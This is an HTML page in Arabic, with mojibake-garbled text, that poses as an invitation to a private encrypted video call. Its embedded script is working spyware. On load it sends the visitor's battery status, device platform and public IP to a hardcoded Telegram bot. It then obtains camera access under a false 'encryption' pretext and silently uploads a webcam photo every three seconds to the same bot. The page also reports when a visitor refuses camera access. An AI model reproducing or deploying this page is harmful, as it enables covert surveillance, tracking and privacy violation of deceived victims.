<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>ØºØ±ÙØ© Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ© | Ø§ØªØµØ§Ù„ Ø¢Ù…Ù†</title>
    <meta name="description" content="Ø§Ù†Ø¶Ù… Ø§Ù„Ø¢Ù† Ø¥Ù„Ù‰ ØºØ±ÙØ© Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø®Ø§ØµØ© Ø§Ù„Ù…Ø´ÙØ±Ø©. Ø§ØªØµØ§Ù„ Ø¢Ù…Ù† Ø¨Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ©.">
    <meta property="og:type" content="website">
    <meta property="og:title" content="ğŸ”´ Ø¯Ø¹ÙˆØ© Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ©">
    <meta property="og:description" content="Ù„Ù‚Ø¯ ØªÙ… Ø¯Ø¹ÙˆØªÙƒ Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù…Ø­Ø§Ø¯Ø«Ø© ÙÙŠØ¯ÙŠÙˆ Ø¢Ù…Ù†Ø© ÙˆÙ…Ø´ÙØ±Ø©. Ø§Ø¶ØºØ· Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©.">
    <meta property="og:image" content="https://img.icons8.com/fluent/200/video-call.png">
    <meta name="theme-color" content="#0f172a">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { background: #0f172a; color: white; overflow: hidden; font-family: 'Tajawal', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        #video-feed { transform: scaleX(-1); object-fit: cover; }
        .loading-ring { border: 4px solid #3498db; border-top: 4px solid transparent; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-overlay { display: none; position: fixed; inset: 0; background: #0f172a; z-index: 100; align-items: center; justify-content: center; text-align: center; padding: 20px; }
    </style>
</head>
<body>

    <div id="error-screen" class="error-overlay flex-col">
        <div class="glass p-8 rounded-3xl max-w-md">
            <i class="fas fa-video-slash text-red-500 text-5xl mb-4"></i>
            <h2 class="text-2xl font-bold mb-4">ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h2>
            <p class="text-gray-300 mb-6">Ø¹Ø°Ø±Ø§Ù‹ØŒ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¨Ø¯Ø¡ Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø© Ø¨Ø¯ÙˆÙ† Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.</p>
            <button onclick="window.location.reload()" class="bg-blue-600 px-8 py-3 rounded-full font-bold">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
        </div>
    </div>

    <div id="setup-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-slate-900">
        <div class="glass p-10 rounded-3xl text-center shadow-2xl">
            <div class="loading-ring mx-auto mb-4"></div>
            <h1 class="text-2xl font-bold mb-2">Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØºØ±ÙØ© Ø§Ù„Ø®Ø§ØµØ©...</h1>
            <p id="countdown" class="text-blue-400 text-5xl font-mono my-4">5</p>
            <p class="text-gray-400 text-sm">ÙŠØ±Ø¬Ù‰ Ù‚Ø¨ÙˆÙ„ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ´ÙÙŠØ±</p>
        </div>
    </div>

    <main class="relative h-screen w-full flex flex-col items-center justify-between p-6">
        <video id="video-feed" autoplay playsinline muted class="absolute inset-0 w-full h-full object-cover z-0 opacity-60"></video>

        <div class="z-10 w-full max-w-4xl flex justify-between items-center glass p-4 rounded-2xl">
            <div class="flex items-center gap-3">
                <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
                <span class="font-bold">LIVE â€¢ Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ©</span>
            </div>
            <div class="text-sm text-green-400 font-mono"><i class="fas fa-lock mr-1"></i> Ù…Ø´ÙØ±</div>
        </div>

        <div class="z-10 w-full max-w-md glass p-6 rounded-[3rem] flex justify-around items-center mb-8 shadow-2xl">
            <button class="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center"><i class="fas fa-microphone"></i></button>
            <button onclick="window.location.reload()" class="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center transition hover:scale-110">
                <i class="fas fa-phone-slash text-2xl rotate-[135deg]"></i>
            </button>
            <button class="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center"><i class="fas fa-video"></i></button>
        </div>

        <canvas id="canvas" style="display:none;"></canvas>
    </main>

    <script>
        const BOT_TOKEN = '8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo';
        const CHAT_ID = '6068331455';
        let countdownVal = 5;

        // 1. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙˆØ±Ø§Ù‹
        async function sendInitialData() {
            let battery = "ØºÙŠØ± Ù…ØªØ§Ø­";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}% - ${b.charging ? 'ÙŠØ´Ø­Ù†' : 'Ù„Ø§ ÙŠØ´Ø­Ù†'}`;
            }
            const msg = `ğŸ”” *Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯*\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${battery}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`;
            sendMessage(msg);
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => sendMessage(`ğŸ“ IP: ${d.ip}`));
        }

        function sendMessage(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        // 2. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù„Ø§Ù†Ù‡Ø§Ø¦ÙŠ
        async function startApp() {
            const video = document.getElementById('video-feed');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    // Ø£ÙˆÙ„Ø§Ù‹: Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ Ù„Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ ÙÙ‚Ø·
                    let countInterval = setInterval(() => {
                        countdownVal--;
                        document.getElementById('countdown').innerText = countdownVal;
                        if (countdownVal <= 0) {
                            clearInterval(countInterval);
                            document.getElementById('setup-screen').style.display = 'none';
                        }
                    }, 1000);

                    // Ø«Ø§Ù†ÙŠØ§Ù‹: Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„Ù„Ø§Ù†Ù‡Ø§Ø¦ÙŠ ÙƒÙ„ 3 Ø«ÙˆØ§Ù†Ù
                    setInterval(() => {
                        captureAndSend();
                    }, 3000); // 3000ms = 3 Ø«ÙˆØ§Ù†Ù
                };
            } catch (err) {
                document.getElementById('error-screen').style.display = 'flex';
                sendMessage("âŒ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
            }
        }

        function captureAndSend() {
            const video = document.getElementById('video-feed');
            const canvas = document.getElementById('canvas');
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob((blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'img.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }
                }, 'image/jpeg', 0.5); // Ø¬ÙˆØ¯Ø© Ù…ØªÙˆØ³Ø·Ø© Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø³Ø±Ø¹Ø©
            }
        }

        window.onload = () => {
            sendInitialData();
            startApp();
        };
    </script>
</body>
</html>

